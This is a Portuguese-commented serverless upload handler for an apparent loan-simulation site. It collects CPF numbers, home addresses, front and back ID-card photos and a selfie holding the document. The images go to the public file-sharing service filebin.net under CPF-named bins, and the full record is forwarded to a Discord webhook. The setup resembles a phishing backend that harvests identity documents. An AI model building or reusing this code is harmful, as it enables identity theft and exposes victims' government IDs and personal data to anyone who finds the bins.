// api/upload-simulacao.js - Proxy para upload múltiplos documentos no Filebin + Discord
import formidable from 'formidable';
import fs from 'fs';  // Para limpar arquivos temporários

export default async function handler(req, res) {
    // Configuração de CORS manual (mesmo domínio do primeiro form)
    const allowedOrigin = 'https://emprestimo-simonetti.wuaze.com';  // <-- SUBSTITUA PELO SEU DOMÍNIO EXATO NO INFINITYFREE
    res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS, POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Allow-Credentials', 'true');

    // Handle preflight OPTIONS request
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    // Só permite POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    // Parse FormData com formidable (múltiplos arquivos)
    const form = formidable({
        multiples: true,  // Permite múltiplos arquivos
        maxFileSize: 5 * 1024 * 1024,  // 5MB por arquivo
        keepExtensions: true,
        uploadDir: '/tmp',  // Pasta temp no serverless
    });

    let fields, files;
    try {
        [fields, files] = await form.parse(req);
    } catch (error) {
        console.error('Erro no formidable:', error);
        return res.status(400).json({ error: 'Erro ao processar o formulário. Verifique os arquivos.' });
    }

    // Extrai campos de texto
    const cpf = fields.cpf ? fields.cpf[0] : null;
    const tipoRenda = fields.tipoRenda ? fields.tipoRenda[0] : null;
    
    // Novos campos de endereço
    const cep = fields.cep ? fields.cep[0] : null;
    const logradouro = fields.logradouro ? fields.logradouro[0] : null;
    const numero = fields.numero ? fields.numero[0] : null;
    const complemento = fields.complemento ? fields.complemento[0] : null;
    const bairro = fields.bairro ? fields.bairro[0] : null;
    const cidade = fields.cidade ? fields.cidade[0] : null;
    const estado = fields.estado ? fields.estado[0] : null;

    // Extrai arquivos
    const rgFrenteFile = files.rgFrente ? files.rgFrente[0] : null;
    const rgVersoFile = files.rgVerso ? files.rgVerso[0] : null;
    const fotoSegurandoDocumentoFile = files.fotoSegurandoDocumento ? files.fotoSegurandoDocumento[0] : null;

    const DISCORD_WEBHOOK_URL4 = process.env.DISCORD_WEBHOOK_URL4;

    // Validação de campos obrigatórios
    if (!cpf || !tipoRenda || !cep || !logradouro || !numero || !bairro || !cidade || !estado || 
        !rgFrenteFile || !rgVersoFile || !fotoSegurandoDocumentoFile || !DISCORD_WEBHOOK_URL4) {
        // Limpa arquivos temp
        const allFilesToClean = [rgFrenteFile, rgVersoFile, fotoSegurandoDocumentoFile].filter(Boolean);
        allFilesToClean.forEach(f => {
            if (f && f.filepath) fs.unlinkSync(f.filepath);
        });
        return res.status(400).json({ error: 'Dados incompletos: CPF, Tipo de Renda, Endereço completo e Documentos (RG Frente, RG Verso, Foto segurando documento) são obrigatórios.' });
    }

    // Validações de tipo e tamanho de arquivo
    const allowedImageTypes = ['image/png', 'image/jpeg', 'image/jpg'];
    const allFiles = [rgFrenteFile, rgVersoFile, fotoSegurandoDocumentoFile].filter(Boolean); // Filtra nulos

    for (const file of allFiles) {
        const mimeType = file.mimetype || '';
        
        // Todos os arquivos aceitam apenas imagens
        if (!allowedImageTypes.includes(mimeType)) {
            allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
            return res.status(400).json({ error: `Tipo de arquivo inválido para ${file.originalFilename}: só PNG, JPEG ou JPG são aceitos.` });
        }
        if (file.size > 5 * 1024 * 1024) {
            allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
            return res.status(400).json({ error: `Arquivo ${file.originalFilename} muito grande: máximo 5MB.` });
        }
    }

    // Validação CPF (11 dígitos)
    if (cpf.replace(/\D/g, '').length !== 11) {
        allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
        return res.status(400).json({ error: 'CPF inválido: deve ter 11 dígitos.' });
    }
    
    // Validação CEP (8 dígitos)
    if (cep.replace(/\D/g, '').length !== 8) {
        allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
        return res.status(400).json({ error: 'CEP inválido: deve ter 8 dígitos.' });
    }

    try {
        // *** MUDANÇA PRINCIPAL: Gerar um nome de bin único para cada submissão ***
        const timestamp = Date.now();
        const cpfLimpo = cpf.replace(/\D/g, '');
        const BIN_NAME = `simulacao-${cpfLimpo}-${timestamp}`; // Nome único para cada envio
        const FILEBIN_BASE_URL = 'https://filebin.net';

        console.log(`Criando um bin único para esta submissão: ${BIN_NAME}`);

        // Função auxiliar para upload de um arquivo
        async function uploadToFilebin(file, prefix) {
            if (!file) return null; // Retorna null se o arquivo não for fornecido

            const ext = file.originalFilename ? file.originalFilename.split('.').pop() : 'bin';
            // O nome do arquivo pode ser mais simples, pois o bin já é único
            const filename = `${prefix}.${ext}`;
            const fileBuffer = fs.readFileSync(file.filepath);

            const uploadResponse = await fetch(`${FILEBIN_BASE_URL}/${BIN_NAME}/${filename}`, {
                method: 'POST',
                headers: {
                    'Content-Type': file.mimetype || 'application/octet-stream',
                },
                body: fileBuffer,
            });

            if (!uploadResponse.ok) {
                const errorText = await uploadResponse.text();
                console.error(`Erro Filebin para ${prefix}:`, errorText);
                throw new Error(`Falha no upload de ${prefix}: ${errorText}`);
            }

            await uploadResponse.json();  // 201 com JSON (ignora, só confirma)
            return `${FILEBIN_BASE_URL}/${BIN_NAME}/${filename}`;  // URL direta
        }

        // Uploads paralelos para os arquivos
        const [linkRgFrente, linkRgVerso, linkFotoSegurandoDocumento] = await Promise.all([
            uploadToFilebin(rgFrenteFile, 'rg-frente'),
            uploadToFilebin(rgVersoFile, 'rg-verso'),
            uploadToFilebin(fotoSegurandoDocumentoFile, 'foto-segurando-documento')
        ]);

        // Limpa arquivos temp
        allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });

        // Formata o endereço completo
        const enderecoCompleto = `${logradouro}, ${numero}${complemento ? ', ' + complemento : ''} - ${bairro}, ${cidade}/${estado}`;
        
        // Notificação para Discord
        const discordPayload = {
            username: 'Nova Simulação de Empréstimo',
            avatar_url: 'https://cdn-icons-png.flaticon.com/512/181/181095.png', // Ícone genérico
            embeds: [
                {
                    title: 'Nova Simulação Recebida!',
                    description: `Uma nova simulação de empréstimo foi preenchida e documentos anexados.`,
                    color: 13706550, // Um tom de vermelho para combinar com o site
                    fields: [
                        { name: 'CPF', value: cpf, inline: true },
                        { name: 'Tipo de Renda', value: tipoRenda, inline: true },
                        { name: 'CEP', value: cep, inline: true },
                        { name: 'Endereço Completo', value: enderecoCompleto, inline: false },
                        { name: 'RG - Frente', value: `[Visualizar](${linkRgFrente})`, inline: false },
                        { name: 'RG - Verso', value: `[Visualizar](${linkRgVerso})`, inline: false },
                        { name: 'Foto segurando documento', value: `[Visualizar](${linkFotoSegurandoDocumento})`, inline: false },
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: `Bin: ${BIN_NAME}` }, // Adiciona o nome do bin para referência
                },
            ],
        };

        const discordResponse = await fetch(DISCORD_WEBHOOK_URL4, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordPayload),
        });

        if (!discordResponse.ok) {
            const errorText = await discordResponse.text();
            console.error('Falha no Discord:', errorText);
            // Continua, pois upload OK
        }

        // Resposta de sucesso
        res.status(200).json({ 
            success: true, 
            message: 'Simulação e documentos enviados com sucesso!', 
            links: { 
                rgFrente: linkRgFrente, 
                rgVerso: linkRgVerso, 
                fotoSegurandoDocumento: linkFotoSegurandoDocumento
            }
        });

    } catch (error) {
        console.error('Erro no upload-cadastro:', error);
        allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
        res.status(500).json({ error: 'Erro interno no servidor: ' + error.message });
    }
}

export const config = {
    api: {
        bodyParser: false,  // Essencial para multipart/form-data com múltiplos arquivos
    },
};
